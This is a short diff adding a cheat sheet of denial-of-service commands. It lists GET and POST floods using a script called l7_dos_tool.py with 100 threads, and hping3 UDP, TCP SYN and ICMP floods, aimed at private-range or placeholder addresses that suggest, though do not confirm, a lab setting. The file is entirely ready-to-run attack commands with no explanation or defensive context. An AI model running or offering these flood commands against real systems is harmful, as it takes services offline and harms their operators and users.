@@ -1,0 +1,17 @@
+GET:
+python3 l7_dos_tool.py --target http://192.168.101.10/ --method get --duration 10 --threads 100
+
+POST:
+python3 l7_dos_tool.py --target http://192.168.101.10/ --method post --duration 10 --threads 100
+
+UDP:
+sudo hping3 --flood --udp -p 80 IP_ADDRESS
+
+TCP:
+sudo hping3 --flood -S -p 80 IP_ADDRESS
+
+ICMP:
+sudo hping3 --flood --icmp 172.16.1.253
+
+
+
